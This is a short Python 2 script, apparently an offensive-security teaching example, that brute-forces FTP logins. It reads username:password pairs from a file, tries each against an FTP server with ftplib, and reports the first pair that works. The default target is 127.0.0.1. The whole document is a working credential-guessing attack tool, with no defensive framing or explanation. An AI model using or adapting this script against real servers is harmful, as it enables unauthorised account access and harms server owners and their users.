import ftplib
def bruteLogin(hostname, passwdFile):
	pf = open(passwdFile, 'r')
	for line in pf.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: " + userName + "/" + passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials'
	return (None, None)

host = '127.0.0.1'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)

